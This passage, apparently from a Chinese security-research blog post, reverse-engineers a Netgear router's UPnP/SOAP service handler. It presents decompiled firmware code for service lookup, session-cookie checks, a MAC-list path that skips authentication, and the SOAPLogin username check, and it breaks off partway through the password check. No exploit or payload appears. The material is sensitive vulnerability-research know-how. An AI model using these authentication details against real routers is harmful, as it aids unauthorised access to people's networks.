src="https://cdn.staticaly.com/gh/L2ksy0d/image-host@master/20230418/image-20230307152406800.2o3coqhbrpk0.webp"></p><p>前面几个<code>Public_UPNP_Cx</code>是有对应XML描述文件的，但是<code>soap/server_sa</code>和<code>soap/server_sa/opendns</code>这两个URL是没有任何描述文件的，所以估计在<code>sub_41900</code>中实现了内部API，经过动调分析其函数签名为：<code>sub_41900(int http, int int_fd, in_addr_t in_addr, int pass)</code>，http指向客户发送的http数据，int_fd则是交互socket，in_addr为客户ip，pass暂未分析出来。下面分析该函数中重点部分</p><h3 id="服务遍历"><a href="#服务遍历" class="headerlink" title="服务遍历"></a>服务遍历</h3><p>程序维护了一个<strong>内部服务名列表</strong>，每个最长30字节，一共11个服务；根据<code>SOAPAction</code>字段所指定的服务名获取对应列表下标：</p><pre class="line-numbers language-c" data-language="c"><code class="language-c">v11 <span class="token operator">=</span> <span class="token function">stristr</span><span class="token punctuation">(</span>http_v4<span class="token punctuation">,</span> <span class="token string">"SOAPAction:"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">!</span>v11 <span class="token punctuation">)</span>  <span class="token keyword">return</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span>v12 <span class="token operator">=</span> aDeviceinfo<span class="token punctuation">;</span>                            <span class="token comment">// parentalcontrol: index == 7  DeviceConfig: index == 1</span>action_v13 <span class="token operator">=</span> v11 <span class="token operator">+</span> <span class="token number">11</span><span class="token punctuation">;</span><span class="token keyword">while</span> <span class="token punctuation">(</span> <span class="token number">1</span> <span class="token punctuation">)</span>                                   <span class="token comment">// travel 11 internal serverName</span><span class="token punctuation">{</span>  ServerNamePTR <span class="token operator">=</span> v12<span class="token punctuation">;</span>  v14 <span class="token operator">=</span> <span class="token function">strchr</span><span class="token punctuation">(</span>action_v13<span class="token punctuation">,</span> <span class="token char">'\r'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  v15 <span class="token operator">=</span> v14 <span class="token operator">-</span> action_v13<span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> v14 <span class="token punctuation">)</span>                                  <span class="token comment">// action length &lt;= 127</span>  <span class="token punctuation">{</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span> v15 <span class="token operator">&gt;</span> <span class="token number">126</span> <span class="token punctuation">)</span>      v15 <span class="token operator">=</span> <span class="token number">127</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span>  <span class="token keyword">else</span>  <span class="token punctuation">{</span>    v15 <span class="token operator">=</span> <span class="token number">127</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span>  <span class="token function">strncpy</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>v93<span class="token punctuation">,</span> action_v13<span class="token punctuation">,</span> v15<span class="token punctuation">)</span><span class="token punctuation">;</span>  v101 <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>  v16 <span class="token operator">=</span> <span class="token function">stristr</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>v93<span class="token punctuation">,</span> v12<span class="token punctuation">)</span><span class="token punctuation">;</span>  v12 <span class="token operator">+=</span> <span class="token number">30</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> v16 <span class="token punctuation">)</span>    <span class="token keyword">break</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">++</span>v8 <span class="token operator">==</span> <span class="token number">11</span> <span class="token punctuation">)</span>  <span class="token punctuation">{</span>    serverIdx <span class="token operator">=</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span>    <span class="token keyword">goto</span> LABEL_14<span class="token punctuation">;</span>  <span class="token punctuation">}</span><span class="token punctuation">}</span>serverIdx <span class="token operator">=</span> v8<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>内部服务有：<strong>DeviceInfo，DeviceConfig，WANIPConnection，WANEthernetLinkConfig，LANConfigSecurity，WLANConfiguration，Time，ParentalControl，AppSystem，AdvancedQoS，UserOptionsTC</strong></p><p>SOAPAction字段构成为：<code>urn:NETGEAR-ROUTER:service:{ServerName}:1#{ActionName}</code></p><h3 id="用户验证"><a href="#用户验证" class="headerlink" title="用户验证"></a>用户验证</h3><pre class="line-numbers language-c" data-language="c"><code class="language-c">  cookie <span class="token operator">=</span> <span class="token function">stristr</span><span class="token punctuation">(</span>http_v4<span class="token punctuation">,</span> <span class="token string">"Cookie:"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  v21 <span class="token operator">=</span> <span class="token function">stristr</span><span class="token punctuation">(</span>http_v4<span class="token punctuation">,</span> <span class="token string">"SOAPAction:"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> v21 <span class="token operator">&amp;&amp;</span> <span class="token operator">*</span><span class="token punctuation">(</span>v21 <span class="token operator">-</span> <span class="token number">2</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token char">'\r'</span> <span class="token operator">&amp;&amp;</span> <span class="token operator">*</span><span class="token punctuation">(</span>v21 <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token char">'\n'</span> <span class="token operator">&amp;&amp;</span> <span class="token punctuation">(</span>a1 <span class="token operator">=</span> v21<span class="token punctuation">,</span> v41 <span class="token operator">=</span> <span class="token function">strchr</span><span class="token punctuation">(</span>v21<span class="token punctuation">,</span> <span class="token operator">*</span><span class="token punctuation">(</span>v21 <span class="token operator">-</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token punctuation">(</span>v42 <span class="token operator">=</span> v41<span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">)</span>  <span class="token punctuation">{</span>    <span class="token operator">*</span>v41 <span class="token operator">=</span> v20<span class="token punctuation">;</span>    login <span class="token operator">=</span> <span class="token function">stristr</span><span class="token punctuation">(</span>a1<span class="token punctuation">,</span> <span class="token string">"service:DeviceConfig:1#SOAPLogin"</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token comment">// service:DeviceConfig:1#SOAPLogin</span>    <span class="token operator">*</span>v42 <span class="token operator">=</span> <span class="token char">'\r'</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span>  <span class="token keyword">else</span>  <span class="token punctuation">{</span>    login <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> cookie <span class="token punctuation">)</span>    login_v23 <span class="token operator">=</span> login<span class="token punctuation">;</span>  <span class="token keyword">else</span>    login_v23 <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">!</span>login_v23 <span class="token operator">||</span> <span class="token punctuation">(</span>v91 <span class="token operator">=</span> <span class="token function">strchr</span><span class="token punctuation">(</span>cookie<span class="token punctuation">,</span> <span class="token char">'\r'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">0</span> <span class="token punctuation">)</span><span class="token comment">// if logined</span>  <span class="token punctuation">{</span>Login_63<span class="token operator">:</span>    Addr_EB9C8 <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>    v43 <span class="token operator">=</span> <span class="token function">inet_ntoa</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">in_addr</span><span class="token punctuation">)</span>int_addr_v6<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">strcpy</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>Addr_EB9C8<span class="token punctuation">,</span> v43<span class="token punctuation">)</span><span class="token punctuation">;</span>    v44 <span class="token operator">=</span> <span class="token function">inet_ntoa</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">in_addr</span><span class="token punctuation">)</span>int_addr_v6<span class="token punctuation">)</span><span class="token punctuation">;</span>    v45 <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token function">acosNvramConfig_get</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span><span class="token string">"lan_ipaddr"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token function">strcmp</span><span class="token punctuation">(</span>v44<span class="token punctuation">,</span> v45<span class="token punctuation">)</span>      <span class="token operator">&amp;&amp;</span> <span class="token punctuation">(</span><span class="token function">strncmp</span><span class="token punctuation">(</span>action_v13<span class="token punctuation">,</span> <span class="token string">" urn:NETGEAR-ROUTER:service:ParentalControl:1#Authenticate"</span><span class="token punctuation">,</span> <span class="token number">0x3Au</span><span class="token punctuation">)</span>       <span class="token operator">&amp;&amp;</span> <span class="token function">strncmp</span><span class="token punctuation">(</span>action_v13<span class="token punctuation">,</span> <span class="token string">" \"urn:NETGEAR-ROUTER:service:ParentalControl:1#Authenticate\""</span><span class="token punctuation">,</span> <span class="token number">0x3Cu</span><span class="token punctuation">)</span>       <span class="token operator">||</span> serverIdx <span class="token operator">!=</span> <span class="token number">7</span><span class="token punctuation">)</span>      <span class="token operator">&amp;&amp;</span> <span class="token punctuation">(</span><span class="token function">strncmp</span><span class="token punctuation">(</span>action_v13<span class="token punctuation">,</span> <span class="token string">" urn:NETGEAR-ROUTER:service:DeviceConfig:1#SOAPLogin"</span><span class="token punctuation">,</span> <span class="token number">0x34u</span><span class="token punctuation">)</span>       <span class="token operator">&amp;&amp;</span> <span class="token function">strncmp</span><span class="token punctuation">(</span>action_v13<span class="token punctuation">,</span> <span class="token string">" \"urn:NETGEAR-ROUTER:service:DeviceConfig:1#SOAPLogin\""</span><span class="token punctuation">,</span> <span class="token number">0x36u</span><span class="token punctuation">)</span>       <span class="token operator">||</span> serverIdx <span class="token operator">!=</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">)</span>    <span class="token punctuation">{</span>      v94 <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>      v95 <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>      v96 <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>      v97 <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>      v98 <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>      v99 <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>      v100 <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>      v93 <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>      <span class="token function">memset</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>s<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0x80u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      v46 <span class="token operator">=</span> <span class="token function">fopen</span><span class="token punctuation">(</span><span class="token string">"/tmp/opendns_auth.tbl"</span><span class="token punctuation">,</span> <span class="token string">"r"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// login recoder</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span> v46 <span class="token punctuation">)</span>      <span class="token punctuation">{</span>        <span class="token function">getMacList</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>v93<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">while</span> <span class="token punctuation">(</span> <span class="token function">fgets</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>s<span class="token punctuation">,</span> <span class="token number">128</span><span class="token punctuation">,</span> v46<span class="token punctuation">)</span> <span class="token punctuation">)</span>        <span class="token punctuation">{</span>          <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token function">strstr</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>s<span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>v93<span class="token punctuation">)</span> <span class="token punctuation">)</span>          <span class="token punctuation">{</span>            <span class="token function">fclose</span><span class="token punctuation">(</span>v46<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">goto</span> Dofunc_34<span class="token punctuation">;</span><span class="token comment">// if the user`s mac_addr in the recode list then don't need check</span>          <span class="token punctuation">}</span>        <span class="token punctuation">}</span>        <span class="token function">fclose</span><span class="token punctuation">(</span>v46<span class="token punctuation">)</span><span class="token punctuation">;</span>        resp_state <span class="token operator">=</span> <span class="token number">401</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token function">respond</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0x20000</span><span class="token punctuation">,</span> XMLBODY<span class="token punctuation">,</span> int_fd_v5<span class="token punctuation">,</span> resp_state<span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token punctuation">}</span>      <span class="token keyword">goto</span> Unauthor_61<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">goto</span> Dofunc_34<span class="token punctuation">;</span>  <span class="token punctuation">}</span>  <span class="token operator">*</span>v91 <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>  v24 <span class="token operator">=</span> <span class="token function">strstr</span><span class="token punctuation">(</span>cookie<span class="token punctuation">,</span> <span class="token string">"sess_id="</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">!</span>v24 <span class="token punctuation">)</span>  <span class="token punctuation">{</span>    <span class="token operator">*</span>v91 <span class="token operator">=</span> <span class="token number">13</span><span class="token punctuation">;</span>    <span class="token keyword">goto</span> Login_63<span class="token punctuation">;</span>  <span class="token punctuation">}</span>  sessPtr <span class="token operator">=</span> v24 <span class="token operator">+</span> <span class="token number">8</span><span class="token punctuation">;</span>  v26 <span class="token operator">=</span> <span class="token function">strchr</span><span class="token punctuation">(</span>v24 <span class="token operator">+</span> <span class="token number">8</span><span class="token punctuation">,</span> <span class="token char">';'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> v26 <span class="token punctuation">)</span>  <span class="token punctuation">{</span>    <span class="token operator">*</span>v26 <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>    v27 <span class="token operator">=</span> v26<span class="token punctuation">;</span>    v28 <span class="token operator">=</span> <span class="token function">sessConfirm</span><span class="token punctuation">(</span>sessPtr<span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>v93<span class="token punctuation">,</span> int_addr_v6<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token operator">*</span>v27 <span class="token operator">=</span> <span class="token number">59</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span>  <span class="token keyword">else</span>  <span class="token punctuation">{</span>    v28 <span class="token operator">=</span> <span class="token function">sessConfirm</span><span class="token punctuation">(</span>sessPtr<span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>v93<span class="token punctuation">,</span> int_addr_v6<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">!</span>v28 <span class="token punctuation">)</span>    <span class="token keyword">goto</span> Unauthor_61<span class="token punctuation">;</span>Unauthor_61<span class="token operator">:</span>    resp_state <span class="token operator">=</span> <span class="token number">401</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token function">respond</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0x20000</span><span class="token punctuation">,</span> XMLBODY<span class="token punctuation">,</span> int_fd_v5<span class="token punctuation">,</span> resp_state<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>验证策略由cookie验证和login验证组成，其中Cookie格式为：<code>sess_id=???????; SameSite=Strict</code>。部分服务提供mac验证，不需要Cookie；在<code>sessConfirm</code>函数中验证session_ID，其内部维护了session列表。</p><h3 id="login"><a href="#login" class="headerlink" title="login"></a>login</h3><p>Cookie中的session ID是通过第一次调用login服务得来的，在<code>sub_41900-&gt;processAction</code>中调用不同服务对应的不同action：</p><pre class="line-numbers language-c" data-language="c"><code class="language-c">Docontrol_35<span class="token operator">:</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> serverIdx <span class="token operator">==</span> <span class="token operator">-</span><span class="token number">1</span>    <span class="token operator">||</span> <span class="token punctuation">(</span>v29 <span class="token operator">=</span> ServerNamePTR<span class="token punctuation">,</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%s()\n"</span><span class="token punctuation">,</span> <span class="token string">"sa_saveXMLServiceType"</span><span class="token punctuation">)</span><span class="token punctuation">,</span>        <span class="token function">memset</span><span class="token punctuation">(</span>soapAction<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">100u</span><span class="token punctuation">)</span><span class="token punctuation">,</span>        <span class="token punctuation">(</span>v30 <span class="token operator">=</span> <span class="token function">stristr</span><span class="token punctuation">(</span>http_v4<span class="token punctuation">,</span> <span class="token string">"urn:"</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span>    <span class="token operator">||</span> <span class="token punctuation">(</span>v31 <span class="token operator">=</span> <span class="token function">stristr</span><span class="token punctuation">(</span>v30 <span class="token operator">+</span> <span class="token number">4</span><span class="token punctuation">,</span> <span class="token string">":"</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">0</span>    <span class="token operator">||</span> <span class="token punctuation">(</span>v32 <span class="token operator">=</span> <span class="token function">stristr</span><span class="token punctuation">(</span>http_v4<span class="token punctuation">,</span> v29<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">0</span> <span class="token punctuation">)</span>  <span class="token punctuation">{</span>Unauthor_61<span class="token operator">:</span>    resp_state <span class="token operator">=</span> <span class="token number">401</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token function">respond</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0x20000</span><span class="token punctuation">,</span> XMLBODY<span class="token punctuation">,</span> int_fd_v5<span class="token punctuation">,</span> resp_state<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span>  v33 <span class="token operator">=</span> <span class="token function">strlen</span><span class="token punctuation">(</span>v29<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">strcat</span><span class="token punctuation">(</span>soapAction<span class="token punctuation">,</span> <span class="token string">"urn:NETGEAR-ROUTER"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  v34 <span class="token operator">=</span> <span class="token function">strlen</span><span class="token punctuation">(</span>soapAction<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">memcpy</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>soapAction<span class="token punctuation">[</span>v34<span class="token punctuation">]</span><span class="token punctuation">,</span> v31<span class="token punctuation">,</span> <span class="token operator">&amp;</span>v32<span class="token punctuation">[</span>v33<span class="token punctuation">]</span> <span class="token operator">-</span> v31<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">strcat</span><span class="token punctuation">(</span>soapAction<span class="token punctuation">,</span> <span class="token string">":1"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"sa_service_type_buf=%s\r\n"</span><span class="token punctuation">,</span> soapAction<span class="token punctuation">)</span><span class="token punctuation">;</span>  flag_v35 <span class="token operator">=</span> ifSSL<span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> ifSSL <span class="token punctuation">)</span>    flag_v35 <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>  v36 <span class="token operator">=</span> <span class="token function">processAction</span><span class="token punctuation">(</span>flag_v35<span class="token punctuation">,</span> serverIdx<span class="token punctuation">,</span> http_v4<span class="token punctuation">,</span> int_fd_v5<span class="token punctuation">,</span> pass_v7<span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span>int_addr_v6<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> v36 <span class="token operator">&gt;</span> <span class="token number">1</span> <span class="token punctuation">)</span>  <span class="token punctuation">{</span>    resp_state <span class="token operator">=</span> v36<span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token function">respond</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0x20000</span><span class="token punctuation">,</span> XMLBODY<span class="token punctuation">,</span> int_fd_v5<span class="token punctuation">,</span> resp_state<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>在<code>processAction</code>函数中主要通过一个<strong>switch case来调用不同action</strong>，在<code>isNameiMatch(const char *keySrc, int key_idx)</code>中根据kei_idx在action列表查对应action名(同样)，然后在对比keySrc(即http data)中是否指定了该action，如果是返回1。</p><pre class="line-numbers language-c" data-language="c"><code class="language-c">serverIdx_v6 <span class="token operator">=</span> serverIdx<span class="token punctuation">;</span>http_v7 <span class="token operator">=</span> http<span class="token punctuation">;</span>flag_a1 <span class="token operator">=</span> ifssl<span class="token punctuation">;</span>fd <span class="token operator">=</span> int_fd<span class="token punctuation">;</span>in_addr_v8 <span class="token operator">=</span> in_addr<span class="token punctuation">;</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%s():type=%d\n"</span><span class="token punctuation">,</span> <span class="token string">"sa_processResponse"</span><span class="token punctuation">,</span> serverIdx<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">switch</span> <span class="token punctuation">(</span> serverIdx_v6 <span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">case</span> <span class="token number">0</span><span class="token operator">:</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token function">isNameiMatch</span><span class="token punctuation">(</span>http_v7<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">1</span> <span class="token punctuation">)</span>            <span class="token keyword">goto</span> LABEL_251<span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token function">isNameiMatch</span><span class="token punctuation">(</span>http_v7<span class="token punctuation">,</span> <span class="token number">19</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">1</span> <span class="token punctuation">)</span>        <span class="token punctuation">{</span>            key_idx <span class="token operator">=</span> <span class="token number">19</span><span class="token punctuation">;</span>            flag_v12 <span class="token operator">=</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span>            <span class="token keyword">goto</span> LABEL_252<span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token punctuation">{</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token comment">/*.data:00083B88 ; specialAction ActionList[400].data:00083B88 ActionList      DCD 0, 0x49BB8, 1, 0x47F68, 2, 0x49BC0, 3, 0x49BD4, 4.data:00083B88                                         ; DATA XREF: GotName:loc_2A91C↑o.data:00083B88                                         ; .text:off_2A960↑o.data:00083B88                 DCD 0x48578, 5, 0x49BE8, 6, 0x49BFC, 7, 0x49C10, 8, 0x49C18.data:00083B88                 DCD 9, 0x49C24, 0xA, 0x49C30, 0xB, 0x49C3C, 0xC, 0x49C4C.data:00083B88                 DCD 0x9B, 0x49C60, 0xD, 0x49C78, 0xE, 0x49C88, 0xF, 0x49C9C.data:00083B88                 DCD 0x10, 0x49CA8, 0x11, 0x49CB8, 0x12, 0x49CC8, 0x13.data:00083B88                 DCD 0x49CD8, 0x14, 0x49CF4, 0x15, 0x49D0C, 0x16, 0x49BB8.data:00083B88                 DCD 0x17, 0x49BB8, 0x18, 0x49BB8, 0x19, 0x49BB8, 0x1A.data:00083B88                 DCD 0x49D24, 0x1B, 0x49D34, 0x1C, 0x49D44, 0x1D, 0x49D58.data:00083B88                 DCD 0x1E, 0x49D68, 0x1F, 0x49D7C, 0x20, 0x49D8C, 0x21.data:00083B88                 DCD 0x49D9C, 0x22, 0x49DB0, 0x23, 0x49DC4, 0x24, 0x49DD8.data:00083B88                 DCD 0x25, 0x49DF0, 0x26, 0x49E0C, 0x27, 0x49E14, 0x28.data:00083B88                 DCD 0x49E28, 0x29, 0x49E34, 0x2A, 0x48250, 0x2B, 0x49E40.data:00083B88                 DCD 0x2C, 0x49E54, 0x2D, 0x49E6C, 0x2E, 0x49E80, 0x2F*/</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>upnp的login action名为<code>SOAPLogin</code>，属于DeviceConfig服务，action下标为197：</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">if</span> <span class="token punctuation">(</span> key_idx <span class="token operator">!=</span> <span class="token number">197</span> <span class="token punctuation">)</span>    <span class="token keyword">goto</span> LABEL_264<span class="token punctuation">;</span>v54 <span class="token operator">=</span> <span class="token function">stristr</span><span class="token punctuation">(</span>http_v7<span class="token punctuation">,</span> <span class="token string">"&lt;Username"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// login check</span>v55 <span class="token operator">=</span> v54<span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span> v54 <span class="token punctuation">)</span><span class="token punctuation">{</span>    v55 <span class="token operator">=</span> <span class="token function">stristr</span><span class="token punctuation">(</span>v54<span class="token punctuation">,</span> <span class="token string">"&gt;"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span> v55 <span class="token punctuation">)</span>    <span class="token punctuation">{</span>        v56 <span class="token operator">=</span> <span class="token function">stristr</span><span class="token punctuation">(</span>http_v7<span class="token punctuation">,</span> <span class="token string">"&lt;/Username&gt;"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span> v56 <span class="token punctuation">)</span>        <span class="token punctuation">{</span>            <span class="token operator">*</span>v56 <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>            v57 <span class="token operator">=</span> v56<span class="token punctuation">;</span>            v55 <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token function">acosNvramConfig_match</span><span class="token punctuation">(</span><span class="token string">"http_username"</span><span class="token punctuation">,</span> v55 <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// what is the original 'http_username' ?</span>            <span class="token operator">*</span>v57 <span class="token operator">=</span> <span class="token char">'&lt;'</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">else</span>        <span class="token punctuation">{</span>            v55 <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span>v58 <span class="token operator">=</span> <span class="token function">stristr</span><span class="token punctuation">(</span>http_v7<span class="token punctuation">,</span> <span class="token string">"&lt;Password"</span><span 